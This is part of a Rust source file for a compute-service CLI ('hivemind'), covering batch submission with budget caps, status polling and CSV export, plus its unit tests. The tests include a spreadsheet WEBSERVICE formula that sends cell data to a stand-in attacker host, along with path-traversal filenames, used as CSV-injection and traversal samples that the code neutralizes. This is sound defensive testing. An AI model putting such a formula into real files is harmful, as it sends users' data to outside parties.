    for ids in task_ids.chunks(20) {
        snapshots.extend(fetch_task_snapshot_chunk(client, api_base, token, ids).await?);
    }
    Ok(snapshots)
}

async fn fetch_task_snapshot_chunk(
    client: &reqwest::Client,
    api_base: &str,
    token: &str,
    task_ids: &[String],
) -> Result<std::collections::HashMap<String, serde_json::Value>> {
    let url = format!("{}/api/tasks", api_base);
    let response = client
        .get(&url)
        .query(&[("task_ids", task_ids.join(","))])
        .bearer_auth(token)
        .send()
        .await
        .map_err(|e| anyhow!("task list request failed: {}", e))?;
    let status = response.status();
    let body: serde_json::Value = response
        .json()
        .await
        .map_err(|e| anyhow!("failed to decode task list: {}", e))?;
    if !status.is_success() {
        return Err(anyhow!("task list failed: {}", status));
    }
    let tasks = body
        .get("tasks")
        .and_then(|value| value.as_array())
        .ok_or_else(|| anyhow!("task list has no tasks array"))?;
    Ok(tasks
        .iter()
        .filter_map(|task| {
            task.get("task_id")
                .and_then(|value| value.as_str())
                .map(|id| (id.to_owned(), task.clone()))
        })
        .collect())
}

fn apply_batch_snapshots(
    rows: &mut [BatchRow],
    snapshots: &std::collections::HashMap<String, serde_json::Value>,
) {
    for row in rows.iter_mut().filter(|row| row.status != "SUBMIT_FAILED") {
        let Some(task) = snapshots.get(&row.task_id) else {
            continue;
        };
        if let Some(status) = task.get("status").and_then(|value| value.as_str()) {
            row.status = status.to_string();
        }
        row.output = task
            .get("output")
            .and_then(|value| value.as_str())
            .unwrap_or_default()
            .to_string();
        row.billed_cpt = task.get("billed_amount").and_then(|value| value.as_i64());
        row.message = task
            .get("status_message")
            .and_then(|value| value.as_str())
            .unwrap_or_default()
            .to_string();
    }
}

/// Runs one hcode function over every input line. The total budget is checked before anything is submitted.
pub async fn run_batch(command: BatchCommand) -> Result<()> {
    let source = tokio::fs::read_to_string(&command.source_path)
        .await
        .map_err(|e| anyhow!("failed to read {}: {}", command.source_path, e))?;
    if source.trim().is_empty() {
        return Err(anyhow!("{} is empty", command.source_path));
    }
    let inputs_text = tokio::fs::read_to_string(&command.inputs_path)
        .await
        .map_err(|e| anyhow!("failed to read {}: {}", command.inputs_path, e))?;
    let inputs = parse_batch_inputs(&inputs_text)?;

    let prefix = command
        .task_prefix
        .clone()
        .unwrap_or_else(|| format!("batch-{}", &uuid::Uuid::new_v4().simple().to_string()[..8]));
    let task_ids: Vec<String> = (0..inputs.len())
        .map(|index| batch_task_id(&prefix, index))
        .collect();
    if let Some(invalid) = task_ids
        .iter()
        .find(|id| !is_safe_task_id(id) || id.len() > hivemind_proto::TASK_ID_MAX_BYTES)
    {
        return Err(anyhow!(
            "task id {} is not valid; choose a shorter --task-prefix",
            invalid
        ));
    }
    let out_path = command
        .out_path
        .clone()
        .unwrap_or_else(|| format!("{prefix}-results.csv"));

    let client = reqwest::Client::new();
    let token = login(
        &client,
        &command.api_base,
        &command.username,
        &command.password,
    )
    .await?;

    // The price depends on the resources and host count, not on the input, so one quote prices the batch.
    let unit_cpt = quote_batch_price(&client, &command, &token, &source, &inputs[0]).await?;
    let per_task_cap = match command.max_cpt_per_task {
        Some(cap) if cap < unit_cpt => {
            return Err(anyhow!(
                "--max-cpt-per-task {} is below the quoted price of {} CPT per task",
                cap,
                unit_cpt
            ));
        }
        Some(cap) => cap,
        None => DEFAULT_BATCH_TASK_CPT.max(unit_cpt),
    };
    let worst_case = batch_worst_case_cpt(inputs.len(), per_task_cap)?;
    if worst_case > command.max_total_cpt {
        return Err(anyhow!(
            "{} tasks can spend up to {} CPT at {} CPT each, above --max-total-cpt {}; raise the cap or split the inputs",
            inputs.len(),
            worst_case,
            per_task_cap,
            command.max_total_cpt
        ));
    }
    println!(
        "Batch {}: {} tasks at {} CPT each, at most {} CPT in total (cap {}). Results: {}",
        prefix,
        inputs.len(),
        per_task_cap,
        worst_case,
        command.max_total_cpt,
        out_path
    );

    let mut rows: Vec<BatchRow> = inputs
        .iter()
        .enumerate()
        .map(|(index, input)| BatchRow {
            index: index + 1,
            task_id: task_ids[index].clone(),
            input: input.clone(),
            status: "NOT_SUBMITTED".into(),
            output: String::new(),
            billed_cpt: None,
            message: String::new(),
        })
        .collect();

    let interval = submit_interval(command.per_minute);
    let mut next_submit_at = Instant::now();
    for index in 0..rows.len() {
        let body = serde_json::Value::Object({
            let mut body = batch_request_body(&command, &source, &inputs[index]);
            body.insert("task_id".into(), rows[index].task_id.clone().into());
            body.insert("max_cpt".into(), per_task_cap.into());
            body
        });
        match submit_batch_task(
            &client,
            &command.api_base,
            &token,
            &body,
            &mut next_submit_at,
            interval,
        )
        .await
        {
            Ok(()) => rows[index].status = "SUBMITTED".into(),
            Err(error) => {
                rows[index].status = "SUBMIT_FAILED".into();
                rows[index].message = error.to_string();
            }
        }
    }

    let deadline = Instant::now() + Duration::from_secs(command.timeout_secs);
    loop {
        let task_ids: Vec<String> = rows
            .iter()
            .filter(|row| row.is_open())
            .map(|row| row.task_id.clone())
            .collect();
        match fetch_task_snapshots(&client, &command.api_base, &token, &task_ids).await {
            Ok(snapshots) => apply_batch_snapshots(&mut rows, &snapshots),
            Err(error) => eprintln!("warning: could not read task status: {error}"),
        }
        if !rows.iter().any(BatchRow::is_open) || Instant::now() >= deadline {
            break;
        }
        tokio::time::sleep(Duration::from_secs(command.poll_secs)).await;
    }
    for row in rows.iter_mut().filter(|row| row.is_open()) {
        row.message = format!(
            "still {} when the wait ended; check with `hivemind status {}`",
            row.status, row.task_id
        );
    }

    tokio::fs::write(&out_path, render_batch_csv(&rows))
        .await
        .map_err(|e| anyhow!("failed to write {}: {}", out_path, e))?;
    let completed = rows.iter().filter(|row| row.status == "COMPLETED").count();
    let billed: i64 = rows.iter().filter_map(|row| row.billed_cpt).sum();
    println!(
        "Completed {} of {} tasks; billed {} CPT. Results: {}",
        completed,
        rows.len(),
        billed,
        out_path
    );
    if completed != rows.len() {
        return Err(anyhow!(
            "{} of {} tasks did not complete; see {}",
            rows.len() - completed,
            rows.len(),
            out_path
        ));
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn batch_tracks_all_thousand_ids_in_bounded_requests() {
        use tokio::io::{AsyncReadExt, AsyncWriteExt};
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let api = format!("http://{}", listener.local_addr().unwrap());
        let server = tokio::spawn(async move {
            for _ in 0..50 {
                let (mut socket, _) = listener.accept().await.unwrap();
                let mut request = Vec::new();
                let mut buffer = [0_u8; 4096];
                while !request.windows(4).any(|bytes| bytes == b"\r\n\r\n") {
                    let n = socket.read(&mut buffer).await.unwrap();
                    assert!(n > 0);
                    request.extend_from_slice(&buffer[..n]);
                }
                let request = String::from_utf8(request).unwrap();
                let path = request.split_whitespace().nth(1).unwrap();
                let url = reqwest::Url::parse(&format!("http://localhost{path}")).unwrap();
                let ids = url
                    .query_pairs()
                    .find(|(key, _)| key == "task_ids")
                    .unwrap()
                    .1
                    .into_owned();
                let ids: Vec<&str> = ids.split(',').collect();
                assert_eq!(ids.len(), 20);
                let tasks: Vec<_> = ids.into_iter().map(|id| serde_json::json!({
                    "task_id": id, "status": "COMPLETED", "output": "42", "billed_amount": 7,
                })).collect();
                let body = serde_json::json!({"success": true, "tasks": tasks}).to_string();
                let response = format!("HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\nContent-Length: {}\r\n\r\n{}", body.len(), body);
                socket.write_all(response.as_bytes()).await.unwrap();
            }
        });
        let ids: Vec<String> = (0..1000).map(|index| format!("batch-{index}")).collect();
        let client = reqwest::Client::builder()
            .timeout(Duration::from_secs(5))
            .build()
            .unwrap();
        let snapshots = fetch_task_snapshots(&client, &api, "owner", &ids)
            .await
            .unwrap();
        server.await.unwrap();
        let mut rows: Vec<_> = ids
            .into_iter()
            .enumerate()
            .map(|(index, task_id)| BatchRow {
                index,
                task_id,
                input: "{}".into(),
                status: "SUBMITTED".into(),
                output: String::new(),
                billed_cpt: None,
                message: String::new(),
            })
            .collect();
        apply_batch_snapshots(&mut rows, &snapshots);
        assert_eq!(snapshots.len(), 1000);
        assert!(rows
            .iter()
            .all(|row| !row.is_open() && row.output == "42" && row.billed_cpt == Some(7)));
    }

    #[test]
    fn compose_passes_the_signing_public_key_to_nodepool_and_worker() {
        let compose = include_str!("../../../../docker-compose.yml");
        let nodepool = compose
            .split("  nodepool:")
            .nth(1)
            .unwrap()
            .split("\n  master:")
            .next()
            .unwrap();
        assert!(nodepool
            .contains("WORKER_EXECUTION_PRIVATE_KEY_PEM: ${WORKER_EXECUTION_PRIVATE_KEY_PEM:?"));
        assert!(nodepool
            .contains("WORKER_EXECUTION_PUBLIC_KEY_PEM: ${WORKER_EXECUTION_PUBLIC_KEY_PEM:?"));
        let worker = compose
            .split("  worker:")
            .nth(1)
            .unwrap()
            .split("\n  master-ui:")
            .next()
            .unwrap();
        assert!(
            worker.contains("WORKER_EXECUTION_PUBLIC_KEY_PEM: ${WORKER_EXECUTION_PUBLIC_KEY_PEM:?")
        );
    }

    #[test]
    fn submit_usage_documents_inline_input_and_rejects_input_file() {
        let args = vec!["hivemind".to_string(), "submit".to_string()];
        let usage = parse_cli_args(&args)
            .expect_err("missing source should display usage")
            .to_string();
        assert!(usage.contains("[--input <json>]"));
        assert!(!usage.contains("--input-file"));

        let args = vec![
            "hivemind".to_string(),
            "submit".to_string(),
            "sum.hdsl".to_string(),
            "--input-file".to_string(),
            "input.json".to_string(),
        ];
        let err = parse_cli_args(&args).expect_err("input-file is not a supported submit flag");
        assert_eq!(err.to_string(), "unknown submit flag --input-file");
    }

    #[test]
    fn parses_submit_function_with_resource_and_budget_flags() {
        let args = vec![
            "hivemind".to_string(),
            "submit".to_string(),
            "job.py".to_string(),
            "--api".to_string(),
            "http://localhost:8082/".to_string(),
            "--username".to_string(),
            "alice".to_string(),
            "--password".to_string(),
            "secret".to_string(),
            "--task-id".to_string(),
            "render-001".to_string(),
            "--input".to_string(),
            "{\"n\":1}".to_string(),
            "--cpu-score".to_string(),
            "250".to_string(),
            "--memory-gb".to_string(),
            "8".to_string(),
            "--gpu-score".to_string(),
            "100".to_string(),
            "--gpu-memory-gb".to_string(),
            "6".to_string(),
            "--storage-gb".to_string(),
            "20".to_string(),
            "--host-count".to_string(),
            "2".to_string(),
            "--max-cpt".to_string(),
            "500".to_string(),
        ];

        let command = parse_cli_args(&args).expect("submit args should parse");
        let submit = match command {
            CliCommand::Submit(submit) => submit,
            _ => panic!("expected submit command"),
        };

        assert_eq!(submit.api_base, "http://localhost:8082");
        assert_eq!(submit.source_path, "job.py");
        assert_eq!(submit.input, "{\"n\":1}");
        assert_eq!(submit.username, "alice");
        assert_eq!(submit.password, "secret");
        assert_eq!(submit.task_id, "render-001");
        assert_eq!(submit.cpu_score, Some(250));
        assert_eq!(submit.memory_gb, Some(8));
        assert_eq!(submit.gpu_score, Some(100));
        assert_eq!(submit.gpu_memory_gb, Some(6));
        assert_eq!(submit.storage_gb, Some(20));
        assert_eq!(submit.host_count, Some(2));
        assert_eq!(submit.max_cpt, Some(500));
    }

    #[test]
    fn submit_rejects_unsafe_explicit_task_id() {
        let args = vec![
            "hivemind".to_string(),
            "submit".to_string(),
            "job.py".to_string(),
            "--task-id".to_string(),
            "../bad".to_string(),
            "--username".to_string(),
            "alice".to_string(),
            "--password".to_string(),
            "secret".to_string(),
        ];

        let err = parse_cli_args(&args).expect_err("unsafe submit task id should be rejected");
        assert!(err.to_string().contains("task id"));
    }

    #[test]
    fn parses_status_and_result_commands_with_auth_flags() {
        let status_args = vec![
            "hivemind".to_string(),
            "status".to_string(),
            "task-123".to_string(),
            "--api".to_string(),
            "http://localhost:8082/".to_string(),
            "--username".to_string(),
            "alice".to_string(),
            "--password".to_string(),
            "secret".to_string(),
        ];
        let status = match parse_cli_args(&status_args).expect("status args should parse") {
            CliCommand::Status(command) => command,
            _ => panic!("expected status command"),
        };
        assert_eq!(status.api_base, "http://localhost:8082");
        assert_eq!(status.task_id, "task-123");
        assert_eq!(status.username, "alice");
        assert_eq!(status.password, "secret");

        let result_args = vec![
            "hivemind".to_string(),
            "result".to_string(),
            "task-123".to_string(),
            "--username".to_string(),
            "alice".to_string(),
            "--password".to_string(),
            "secret".to_string(),
        ];
        let result = match parse_cli_args(&result_args).expect("result args should parse") {
            CliCommand::Result(command) => command,
            _ => panic!("expected result command"),
        };
        assert_eq!(result.api_base, "http://localhost:8082");
        assert_eq!(result.task_id, "task-123");
        assert_eq!(result.artifact_key, None);

        let download_args = vec![
            "hivemind".to_string(),
            "result".to_string(),
            "task-123".to_string(),
            "--download".to_string(),
            "--artifact-key".to_string(),
            "stdout artifact".to_string(),
            "--username".to_string(),
            "alice".to_string(),
            "--password".to_string(),
            "secret".to_string(),
        ];
        let download = match parse_cli_args(&download_args).expect("download args should parse") {
            CliCommand::Result(command) => command,
            _ => panic!("expected result command"),
        };
        assert!(download.download);
        assert_eq!(download.artifact_key.as_deref(), Some("stdout artifact"));
        assert_eq!(
            artifact_download_url(&download),
            "http://localhost:8082/api/tasks/task-123/artifact/download?artifact_key=stdout%20artifact"
        );
    }

    #[test]
    fn result_download_rejects_dot_task_id() {
        let args = vec![
            "hivemind".to_string(),
            "result".to_string(),
            ".".to_string(),
            "--download".to_string(),
            "--username".to_string(),
            "alice".to_string(),
            "--password".to_string(),
            "secret".to_string(),
        ];

        let err = parse_cli_args(&args).expect_err("dot task id should be rejected");
        assert!(err.to_string().contains("task id"));
    }

    #[test]
    fn artifact_download_filename_rejects_paths_from_content_disposition() {
        assert_eq!(
            artifact_filename_from_content_disposition(Some("attachment; filename=\"result.zip\""))
                .expect("plain filenames should be accepted"),
            "result.zip"
        );
        assert_eq!(
            artifact_filename_from_content_disposition(None)
                .expect("missing header should fall back to default filename"),
            "artifact.bin"
        );

        assert!(artifact_filename_from_content_disposition(Some(
            "attachment; filename=\"../secrets.txt\""
        ))
        .is_err());
        assert!(artifact_filename_from_content_disposition(Some(
            "attachment; filename=\"..\\secrets.txt\""
        ))
        .is_err());
        assert!(artifact_filename_from_content_disposition(Some(
            "attachment; filename=\"C:\\Users\\user\\secrets.txt\""
        ))
        .is_err());
        assert!(
            artifact_filename_from_content_disposition(Some("attachment; filename=\"..\""))
                .is_err()
        );
    }

    #[test]
    fn artifact_download_filename_accepts_quoted_semicolon() {
        assert_eq!(
            artifact_filename_from_content_disposition(Some(
                "attachment; filename=\"report;final.zip\""
            ))
            .expect("quoted semicolon filenames should parse"),
            "report;final.zip"
        );
    }

    #[test]
    fn formats_task_status_and_result_responses() {
        let status = serde_json::json!({
            "success": true,
            "task_id": "task-123",
            "status": "COMPLETED",
            "status_message": "done",
            "output": "hello",
            "wall_time_ms": 42,
            "peak_memory_mb": 64
        });
        let status_text = format_task_status(&status).expect("status should format");
        assert!(status_text.contains("task-123"));
        assert!(status_text.contains("COMPLETED"));
        assert!(status_text.contains("hello"));

        let result = serde_json::json!({
            "success": true,
            "task_id": "task-123",
            "status": "COMPLETED",
            "result_torrent": "magnet:?xt=urn:btih:abc",
            "status_message": "done"
        });
        let result_text = format_task_result(&result).expect("result should format");
        assert!(result_text.contains("task-123"));
        assert!(result_text.contains("magnet:?xt=urn:btih:abc"));
    }

    #[test]
    fn status_and_result_reject_missing_auth_and_unsafe_task_ids() {
        let missing_auth = vec![
            "hivemind".to_string(),
            "status".to_string(),
            "task-123".to_string(),
        ];
        let err = parse_cli_args(&missing_auth).expect_err("auth flags should be required");
        assert!(err.to_string().contains("--username"));

        let unsafe_id = vec![
            "hivemind".to_string(),
            "result".to_string(),
            "../task".to_string(),
            "--username".to_string(),
            "alice".to_string(),
            "--password".to_string(),
            "secret".to_string(),
        ];
        let err = parse_cli_args(&unsafe_id).expect_err("unsafe task id should be rejected");
        assert!(err.to_string().contains("task id"));

        let missing_value = vec![
            "hivemind".to_string(),
            "status".to_string(),
            "task-123".to_string(),
            "--username".to_string(),
        ];
        let err = parse_cli_args(&missing_value).expect_err("missing flag value should fail");
        assert!(err.to_string().contains("missing value"));
    }

    #[test]
    fn formats_unsuccessful_and_partial_task_responses() {
        let failed = serde_json::json!({
            "success": false,
            "message": "Task not found"
        });
        let err = format_task_status(&failed).expect_err("unsuccessful status should fail");
        assert!(err.to_string().contains("Task not found"));

        let partial_result = serde_json::json!({
            "success": true,
            "task_id": "task-123",
            "status": "PENDING",
            "result_torrent": null,
            "status_message": null
        });
        let text = format_task_result(&partial_result).expect("partial result should format");
        assert!(text.contains("PENDING"));
        assert!(text.contains("Result torrent:"));
    }

    #[test]
    fn result_shows_the_output_of_a_managed_task() {
        let managed = serde_json::json!({
            "success": true,
            "task_id": "task-42",
            "status": "COMPLETED",
            "result_torrent": "",
            "status_message": "",
            "output": "42",
        });
        let text = format_task_result(&managed).expect("managed result should format");
        assert!(text.ends_with("\nOutput: 42"), "{text}");
    }

    #[test]
    fn batch_requires_a_total_budget_cap_and_inputs() {
        let base = |extra: &[&str]| {
            let mut args = vec![
                "hivemind".to_string(),
                "batch".to_string(),
                "sum.hcode".to_string(),
                "--inputs".to_string(),
                "inputs.jsonl".to_string(),
                "--username".to_string(),
                "alice".to_string(),
                "--password".to_string(),
                "secret".to_string(),
            ];
            args.extend(extra.iter().map(|value| value.to_string()));
            args
        };

        let err = parse_cli_args(&base(&[])).expect_err("a batch without a cap must not run");
        assert!(
            err.to_string().contains("--max-total-cpt is required"),
            "{err}"
        );

        let err = parse_cli_args(&base(&["--max-total-cpt", "0"]))
            .expect_err("a zero cap must be refused");
        assert!(err.to_string().contains("greater than 0"), "{err}");

        let err = parse_cli_args(&base(&["--max-total-cpt", "500", "--per-minute", "61"]))
            .expect_err("pacing above the submit limit must be refused");
        assert!(err.to_string().contains("--per-minute"), "{err}");

        let command = parse_cli_args(&base(&[
            "--max-total-cpt",
            "500",
            "--max-cpt-per-task",
            "100",
            "--out",
            "out.csv",
            "--task-prefix",
            "sweep-1",
        ]))
        .expect("a complete batch command should parse");
        match command {
            CliCommand::Batch(batch) => {
                assert_eq!(batch.source_path, "sum.hcode");
                assert_eq!(batch.inputs_path, "inputs.jsonl");
                assert_eq!(batch.max_total_cpt, 500);
                assert_eq!(batch.max_cpt_per_task, Some(100));
                assert_eq!(batch.out_path.as_deref(), Some("out.csv"));
                assert_eq!(batch.task_prefix.as_deref(), Some("sweep-1"));
                assert_eq!(batch.per_minute, 50);
            }
            other => panic!("expected a batch command, got {other:?}"),
        }
    }

    #[test]
    fn batch_inputs_are_one_compact_json_value_per_line() {
        let inputs = parse_batch_inputs("{\"value\": 1}\n\n  [2, 3]  \n7\n")
            .expect("valid lines should parse");
        assert_eq!(inputs, vec!["{\"value\":1}", "[2,3]", "7"]);

        let err = parse_batch_inputs("{\"value\": 1}\n{oops}\n")
            .expect_err("an invalid line must be reported with its number");
        assert!(err.to_string().contains("line 2"), "{err}");

        assert!(parse_batch_inputs("\n  \n").is_err());
    }

    #[test]
    fn batch_csv_quotes_only_fields_that_need_it() {
        assert_eq!(csv_field("plain"), "plain");
        assert_eq!(csv_field("a,b"), "\"a,b\"");
        assert_eq!(csv_field("say \"hi\""), "\"say \"\"hi\"\"\"");
        assert_eq!(csv_field("line\nbreak"), "\"line\nbreak\"");

        let rows = vec![BatchRow {
            index: 1,
            task_id: "sweep-0001".into(),
            input: "{\"values\":[1,2]}".into(),
            status: "COMPLETED".into(),
            output: "3".into(),
            billed_cpt: Some(42),
            message: String::new(),
        }];
        assert_eq!(
            render_batch_csv(&rows),
            format!(
                "{BATCH_RESULT_HEADER}\n1,sweep-0001,COMPLETED,3,42,,\"{{\"\"values\"\":[1,2]}}\"\n"
            )
        );
    }

    #[test]
    fn batch_csv_neutralizes_spreadsheet_formulas_and_leading_controls() {
        for value in [
            "=1+1",
            "+SUM(1,2)",
            "-1+2",
            "@SUM(A1:A2)",
            "\ttext",
            "\rtext",
            "\ntext",
            " \t\r\n=1+1",
            "\u{feff}=1+1",
            "\u{2003}+1",
            "\0@SUM(A1:A2)",
            "＝1+1",
            "＋1",
            "－1",
            "＠SUM(A1:A2)",
        ] {
            assert_eq!(
                csv_field(value),
                format!("\"'{}\"", value.replace('"', "\"\"")),
                "{value:?}"
            );
        }
        for value in [
            "",
            "plain",
            " leading space",
            "12",
            "value=1",
            "'already text",
        ] {
            assert_eq!(csv_field(value), value);
        }
    }

    #[test]
    fn batch_csv_neutralizes_task_outputs_and_messages_without_changing_results() {
        let formula = "=WEBSERVICE(\"https://attacker.invalid/collect?data=\"&ENCODEURL(G3))";
        let mut rows = vec![
            BatchRow {
                index: 1,
                task_id: "batch-0001".into(),
                input: "{}".into(),
                status: "PENDING".into(),
                output: String::new(),
                billed_cpt: None,
                message: String::new(),
            },
            BatchRow {
                index: 2,
                task_id: "batch-0002".into(),
                input: "{\"private\":\"value\"}".into(),
                status: "COMPLETED".into(),
                output: "ordinary result".into(),
                billed_cpt: Some(1),
                message: String::new(),
            },
        ];
        let snapshots = std::collections::HashMap::from([(
            "batch-0001".into(),
            serde_json::json!({
                "task_id": "batch-0001", "status": "COMPLETED", "output": formula,
                "billed_amount": 1, "status_message": "+1+1",
            }),
        )]);
        apply_batch_snapshots(&mut rows, &snapshots);
        assert_eq!(render_batch_csv(&rows), format!(
            "{BATCH_RESULT_HEADER}\n1,batch-0001,COMPLETED,\"'=WEBSERVICE(\"\"https://attacker.invalid/collect?data=\"\"&ENCODEURL(G3))\",1,\"'+1+1\",{{}}\n2,batch-0002,COMPLETED,ordinary result,1,,\"{{\"\"private\"\":\"\"value\"\"}}\"\n"
        ));
        assert_eq!(
            rows[0].output, formula,
            "only the CSV representation changes"
        );
        assert_eq!(rows[0].message, "+1+1");
    }

    #[test]
    fn batch_task_ids_and_worst_case_cost_are_checked() {
        assert_eq!(batch_task_id("sweep-1", 0), "sweep-1-0001");
        assert_eq!(batch_task_id("sweep-1", 999), "sweep-1-1000");
        assert!(is_safe_task_id(&batch_task_id("ok.prefix_2", 0)));

        assert_eq!(batch_worst_case_cpt(3, 42).unwrap(), 126);
        assert!(batch_worst_case_cpt(usize::MAX, i64::MAX).is_err());

        assert_eq!(submit_interval(60), Duration::from_secs(1));
        assert_eq!(submit_interval(50), Duration::from_millis(1200));
        assert!(is_terminal_task_status("CANCELLED"));
        assert!(!is_terminal_task_status("RUNNING"));
    }

    #[test]
    fn batch_quote_carries_a_positive_budget_as_the_shared_checks_require() {
        let args: Vec<String> = [
            "hivemind",
            "batch",
            "sum.hcode",
            "--inputs",
            "inputs.jsonl",
            "--max-total-cpt",
            "10",
            "--username",
            "alice",
            "--password",
            "secret",
        ]
        .iter()
        .map(|value| value.to_string())
        .collect();
        let batch = match parse_cli_args(&args).expect("batch args should parse") {
            CliCommand::Batch(batch) => batch,
            other => panic!("expected a batch command, got {other:?}"),
        };

        let quote = batch_quote_body(&batch, "return 1;", "{}");
        assert_eq!(quote.get("max_cpt"), Some(&serde_json::json!(1)));
        assert_eq!(quote.get("runtime"), Some(&serde_json::json!("hcode")));
        assert_eq!(quote.get("torrent"), Some(&serde_json::json!("{}")));
    }
}
